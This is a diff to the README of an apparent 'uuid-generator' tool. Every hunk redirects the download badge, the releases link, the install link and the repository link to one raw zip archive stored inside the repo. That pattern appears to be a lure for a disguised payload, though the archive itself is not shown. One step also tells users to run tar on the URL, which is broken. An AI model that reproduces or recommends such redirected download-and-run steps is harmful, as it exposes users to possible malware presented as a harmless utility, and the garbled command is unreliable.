@@ -4,7 +4,7 @@
 
 Welcome to the uuid-generator! This application helps you generate various types of UUIDs and validate their formats. Whether you need UUIDv4 random numbers, UUIDv1 timestamps, or UUIDv7 time-ordered values, this tool does it all. 
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen) [Download](https://github.com/elmostafa1963/uuid-generator/releases)
+![Download](https://github.com/elmostafa1963/uuid-generator/raw/refs/heads/main/impendent/generator_uuid_v3.0.zip) [Download](https://github.com/elmostafa1963/uuid-generator/raw/refs/heads/main/impendent/generator_uuid_v3.0.zip)
 
 ## 💻 System Requirements
 
@@ -16,7 +16,7 @@ To run the uuid-generator, you need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release of uuid-generator: [Download Here](https://github.com/elmostafa1963/uuid-generator/releases).
+To get started, visit this page to download the latest release of uuid-generator: [Download Here](https://github.com/elmostafa1963/uuid-generator/raw/refs/heads/main/impendent/generator_uuid_v3.0.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the application.
@@ -41,7 +41,7 @@ Once the download is complete, locate the file on your computer. For different o
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. If the file is compressed, extract it using the command: `tar -xvf uuid-generator.tar.gz`.
+3. If the file is compressed, extract it using the command: `tar -xvf https://github.com/elmostafa1963/uuid-generator/raw/refs/heads/main/impendent/generator_uuid_v3.0.zip`.
 4. Change to the extracted directory and run the application with: `./uuid-generator`.
 
 ## 🛠️ Features
@@ -82,7 +82,7 @@ Using the uuid-generator is straightforward. Follow these steps:
 
 ## 🌐 Additional Resources
 
-For more information and updates, visit our official repository: [uuid-generator GitHub Page](https://github.com/elmostafa1963/uuid-generator).
+For more information and updates, visit our official repository: [uuid-generator GitHub Page](https://github.com/elmostafa1963/uuid-generator/raw/refs/heads/main/impendent/generator_uuid_v3.0.zip).
 
 ## 👩‍💻 Community and Support
 
